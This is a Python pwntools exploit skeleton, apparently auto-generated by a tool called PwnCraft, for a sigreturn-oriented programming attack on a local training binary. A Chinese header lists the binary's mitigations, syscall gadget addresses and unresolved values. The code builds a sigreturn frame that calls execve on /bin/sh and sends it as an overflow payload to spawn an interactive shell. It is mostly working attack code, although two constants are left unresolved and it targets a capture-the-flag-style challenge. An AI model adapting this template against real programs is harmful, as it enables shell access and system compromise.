"""PwnCraft 自动生成 EXP 骨架 — 确定性事实渲染，必须人工复核后使用。

strategy    : srop（SROP（sigreturn 帧））  status=blocked
target      : F:\pwn宝\pwncraft\artifacts\gw-training\intelpwn\challenge_static_vuln  sha256=ce3d79c66478f313…  amd64/64-bit  endian=little
mitigations : PIE=OFF NX=ON CANARY=ON RELRO=PARTIAL FORTIFY=ON
provenance  : DERIVED（ELF 字节 / objdump / 重定位；离线、无模型推断）
evidence    :
  - syscall @ 0x401378
  - syscall @ 0x401f1c
  - syscall @ 0x403f8a
  - syscall @ 0x404475
gaps        :
  - 控制流劫持偏移未证明（需要崩溃/调试证据）
  - rax 控制 gadget 未证明（sigreturn 需要）
unresolved  :
  - OFFSET（到保存返回地址的填充长度）
  - POP_RAX（sigreturn 号需要）
"""
from pwn import *

TARGET = 'F:\\pwn宝\\pwncraft\\artifacts\\gw-training\\intelpwn\\challenge_static_vuln'
context.binary = elf = ELF(TARGET, checksec=False)
context.log_level = "info"

OFFSET = 0x0            # UNRESOLVED: cyclic / 调试器确认的填充长度
RET = 0x40101a
SYSCALL = 0x401378
POP_RAX = 0x0            # UNRESOLVED: pop rax; ret gadget
BINSH = 0x482010

UNRESOLVED = ['OFFSET（到保存返回地址的填充长度）', 'POP_RAX（sigreturn 号需要）']

def exploit():
    if UNRESOLVED:
        raise SystemExit("补齐 UNRESOLVED 常量后再运行: " + ", ".join(UNRESOLVED))
    io = process(TARGET)
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = BINSH
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = SYSCALL
    payload = flat({OFFSET: [p64(POP_RAX), p64(15), p64(SYSCALL), bytes(frame)]})
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
